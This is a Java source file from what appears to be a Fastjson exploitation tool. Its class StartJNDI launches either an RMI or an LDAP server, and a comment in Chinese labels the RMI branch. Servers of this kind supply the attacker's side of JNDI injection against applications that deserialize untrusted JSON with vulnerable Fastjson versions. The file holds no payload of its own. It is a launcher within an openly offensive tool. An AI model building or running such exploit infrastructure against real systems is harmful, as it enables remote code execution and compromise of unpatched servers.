package com.fastjsontool.exploit.JNDI;

import com.fastjsontool.exploit.Info;
import com.unboundid.ldap.sdk.LDAPException;

import javax.naming.NamingException;
import java.io.IOException;
import java.net.UnknownHostException;
import java.rmi.AlreadyBoundException;

public class StartJNDI implements Runnable {
    private static String type = Info.type;

    @Override
    public void run() {
        switch (type) {
            case "rmi": //开启rmi服务
                try {
                    RMISERVER.rmiServer();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NamingException e) {
                    e.printStackTrace();
                } catch (AlreadyBoundException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                break;
            case "ldap":
            default:
                try {
                    LDAPSERVER.ldapServer();
                } catch (LDAPException e) {
                    e.printStackTrace();
                } catch (UnknownHostException e) {
                    e.printStackTrace();
                }
                break;
        }
    }
}
